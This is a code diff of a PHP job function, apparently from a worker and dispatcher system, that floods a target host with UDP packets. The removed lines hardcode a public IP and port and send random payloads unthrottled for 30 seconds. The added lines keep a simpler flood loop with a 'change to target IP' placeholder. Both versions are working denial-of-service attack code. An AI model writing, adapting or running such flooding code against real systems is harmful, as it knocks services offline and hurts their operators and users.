@@ -234,128 +234,49 @@ function workerProgress(
 
 function job1(): array
 {
-    $targetIp = '35.79.103.37';
-    $targetPort = 9070;
+    // --- Configuration ---
+    $targetIp = '127.0.0.1'; // Change to target IP
+    $targetPort = 80;        // Change to target port
+    $packetSize = 1024;      // Packet size in bytes
+    $duration = 5;           // Duration in seconds
 
-    // Bounded parameters for server safety/compatibility
-    $packetSize = 1000;
-    $duration = 30;
-
-
-    // --------------------------------------------------------
-    // Validate configuration
-    // --------------------------------------------------------
-
-    if ($targetPort < 1 || $targetPort > 65535) {
-        return [
-            'success' => false,
-            'error' => 'Invalid UDP port'
-        ];
-    }
-
-    // --------------------------------------------------------
-    // Create socket
-    // --------------------------------------------------------
-
-    $socket = socket_create(
-        AF_INET,
-        SOCK_DGRAM,
-        SOL_UDP
-    );
-
+    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+    
     if ($socket === false) {
         return [
             'success' => false,
-            'error' => 'socket_create failed: ' . socket_strerror(socket_last_error())
+            'packets_sent' => 0,
+            'error' => socket_strerror(socket_last_error())
         ];
     }
 
-    // Optimize send buffer for maximum throughput
-    @socket_set_option($socket, SOL_SOCKET, SO_SNDBUF, 65536);
-
-
-    // --------------------------------------------------------
-    // Generate payload
-    // --------------------------------------------------------
-
-    try {
-        $payload = random_bytes($packetSize);
-        $payloadLength = strlen($payload);
-    } catch (Throwable $e) {
-        socket_close($socket);
-        return [
-            'success' => false,
-            'error' => 'Could not generate payload: ' . $e->getMessage()
-        ];
-    }
-
-
-    // --------------------------------------------------------
-    // Timing & Statistics
-    // --------------------------------------------------------
-
-    $start = microtime(true);
-    $deadline = $start + $duration;
-
-    $sent = 0;
-    $failed = 0;
+    $payload = random_bytes($packetSize);
+    $end_time = time() + $duration;
+    $packet_count = 0;
     $lastError = null;
 
-
-    // --------------------------------------------------------
-    // Main loop (Unthrottled / Maximum Speed)
-    // --------------------------------------------------------
-
-    while (microtime(true) < $deadline) {
-
-        // Send packet as fast as possible without pacing/usleep delays
-        $result = @socket_sendto(
-            $socket,
-            $payload,
-            $payloadLength,
-            0,
-            $targetIp,
-            $targetPort
-        );
-
-        if ($result === false) {
-            $failed++;
-            $lastError = socket_strerror(
-                socket_last_error($socket)
-            );
-        } elseif ($result !== $payloadLength) {
-            $failed++;
-            $lastError = 'Partial UDP send';
-        } else {
-            $sent++;
+    try {
+        while (time() < $end_time) {
+            $sent = socket_sendto($socket, $payload, $packetSize, 0, $targetIp, $targetPort);
+            if ($sent !== false) {
+                $packet_count++;
+            } else {
+                $errCode = socket_last_error($socket);
+                $lastError = socket_strerror($errCode);
+            }
         }
+    } catch (Exception $e) {
+        $lastError = $e->getMessage();
+    } finally {
+        socket_close($socket);
     }
 
-
-    // --------------------------------------------------------
-    // Cleanup
-    // --------------------------------------------------------
-
-    socket_close($socket);
-
-
-    // --------------------------------------------------------
-    // Final result
-    // --------------------------------------------------------
-
-    $success = $sent > 0;
-
     return [
-        'success' => $success,
-        'target' => $targetIp . ':' . $targetPort,
-        'duration' => $duration,
-        'packet_size' => $packetSize,
-        'packets_sent' => $sent,
-        'packets_failed' => $failed,
-        'last_error' => $lastError
+        'success' => $packet_count > 0,
+        'packets_sent' => $packet_count,
+        'error' => $lastError ?: null
     ];
 }
-
 
 // ============================================================
 // JOB DISPATCHER
